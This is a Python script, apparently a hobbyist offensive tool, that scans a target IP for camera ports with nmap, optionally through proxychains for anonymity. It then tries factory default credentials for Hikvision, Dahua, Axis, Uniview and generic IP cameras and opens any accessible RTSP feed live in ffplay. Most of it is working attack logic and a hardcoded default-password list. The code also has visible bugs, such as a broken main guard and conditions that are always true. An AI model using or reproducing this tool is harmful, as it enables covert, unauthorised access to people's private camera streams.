#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import cmd
import socket
import subprocess
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

BANNER = """
..............................................
..................................................
..................................................
..................................................
..................................................
..................................................
......................,,,,,,,.....................
............,ffi,...,:::::::::,...:tLt............
............,GGGGGGGGGGGGGGGGGGGGGGGGC............
............,GGGGGGGGGGGGGGGGGGGGGGGGC............
............,GGGGGGGGGGGGGGGGGGGGGGGGC............
..............:iGGGGGGGGGGGGGGGGGGL::.............
.............:GGGGGGGGGGGGGGGGGGGGGGC.............
..............:GGGCff:......,:LLGGGC..............
...............GGGLGGGt;GCL.GGG.GGG...............
...............:GGLGG.fL.iG.f.G.GGC...............
................:GLGG.fGGGG,L.G.GG................
..................LGGG,L1:GiCGG.t.................
....................fGGGGGGGGG....................
...............,,,,,,,,,,,,,,,,,,,.,..............
..................................................
  /\  /\___| | | ___   /__   \ |__   ___ _ __ ___ 
 / /_/ / _ \ | |/ _ \    / /\/ '_ \ / _ \ '__/ _ \
/ __  /  __/ | | (_) |  / /  | | | |  __/ | |  __/
\/ /_/ \___|_|_|\___/   \/   |_| |_|\___|_|  \___|

             [ made by alecto]
"""

CAMERA_PROFILES = {
    "Hikvision": {
        "paths": ["/Streaming/Channels/101", "/Streaming/Channels/102", "/live"],
        "creds": [("admin", "123456"), ("admin", "admin"), ("root", "root"), ("admin", "1234")]
    },
    "Dahua": {
        "paths": ["/cam/realmonitor?channel=1&subtype=0", "/live/ch0"],
        "creds": [("admin", "admin"), ("admin", "123456"), ("root", "root")]
    },
    "Axis": {
        "paths": ["/axis-media/media.amp"],
        "creds": [("root", "pass"), ("admin", "admin")]
    },
    "Uniview": {
        "paths": ["/unicast/c1/s0/live"],
        "creds": [("admin", "123456"), ("admin", "admin")]
    },
    "Generic": {
        "paths": ["/live", "/videoMain", "/rtsp_tunnel", "/live.sdp"],
        "creds": [("admin", "123456"), ("admin", "admin"), ("root", "root"), ("", "")]
    }
}
def ask_anonimity():
    print("Do you want to use Tor/Proxy for anonymity")
    choice = input("Y for Yes N For No Y/N?:").strip().lower()
    if choice == ['y']:
        print("Anonimity selected the proxychains should be configurated")
        return True
    print("Countinue with out anonimity")
    return False



def get_ip():
    
    target_ip = input("Enter the Target İp Adresse").strip()

    parts = target_ip.split('.')
    if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
        print("Invalid IP address format.")
        return None
    return target_ip

def scan_ports(target_ip, use_anon=False):
    print(f"\n[*] IP Address is scanning: {target_ip} ...")
    ports = "80,554,8080,8554"

    cmd = ["nmap", "-sT", "-Pn", "-n", "-p", ports , target_ip]
    if use_anon:
        cmd = ["proxychains"] + cmd

    
    open_ports = []
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)

        for port in [554,8000,80,8080,8554]:
            if f"{port}/tcp open" in result.stdout:
                open_ports.append(port)
    except subprocess.CalledProcessError as e:
        print(f"Error executing nmap: {e}")
    except FileNotFoundError:
        print("Nmap is not installed or not found in PATH")

    return open_ports

def analyze_rtsp(target_ip):
    print("RTSP service is analyzing")
    cmd = ["curl", "-s", "-I", "-X", "DESCRIBE", f"rtsp://{target_ip}:554/live"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        output = result.stdout

        auth_type = "Unknown"
        if "WWW-Authenticate: Basic" in output:
            auth_type = "BASIC"
        elif "WWW-Authenticate: Digest" in output:
            auth_type = "DIGEST"
        print(f"[+] Detected Authentication: {auth_type}")
        return auth_type, output
    except Exception as e:
        print(f"[-] Analysis failed: {e}")
        return None, ""

def analyze_http(target_ip, use_anon):
    print("HTTP service is analyzing")
    if use_anon:
        cmd = ["proxychains", "curl", "-s", "-X", "POST", f"http://{target_ip}:8000"]
    else:
        cmd = ["curl", "-s", "-X", "POST", f"http://{target_ip}:8000"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        return result.stdout
    except Exception as e:
        print(f"[-] Analysis failed: {e}")
        return None

def test_credentials_and_stream(target_ip):
    """Markalara özel fabrika çıkış şifrelerini test eder ve başarılı akışı ffplay ile açar."""
    print("[*] Testing factory passwords...")
    
    for brand, profile in CAMERA_PROFILES.items():
        for path in profile["paths"]:
            for username, password in profile["creds"]:
                url = f"rtsp://{username}:{password}@{target_ip}:554{path}" if username else f"rtsp://{target_ip}:554{path}"
                
                test_cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-I", "-X", "DESCRIBE", url]
                try:
                    res = subprocess.run(test_cmd, capture_output=True, text=True, timeout=3)
                    if "200" in res.stdout or res.stdout.strip() == "200":
                        print(f"\n[!] Successful! Brand/Profile: {brand}")
                        print(f"[!] Working URL: {url}")
                        
                        choice = input("[?] Start live stream with ffplay? (E/h): ").strip().lower()
                        if choice in ['', 'e', 'evet']:
                            run_ffplay(url)
                        return True
                except Exception:
                    continue
    print("No match with default credentials found.")
    return False

def run_ffplay(rtsp_url):
    print(f"[*] Starting live stream with ffplay: {rtsp_url}")
    cmd = ["ffplay", "-rtsp_transport", "tcp", rtsp_url]
    subprocess.run(cmd)




if _name_ == "_main_":
    print(BANNER)



    use_anon = ask_anonimity()


    target_ip = get_ip()
    if target_ip:
        open_ports = scan_ports(target_ip, use_anon)

        if 554 or 8554 in open_ports:
            analyze_rtsp(target_ip)
            test_credentials_and_stream(target_ip)
        else:
            print("No RTSP ports found open. Try Diffrent IP Address.")
            
            



        

            





    
    





    

    
    



    

    







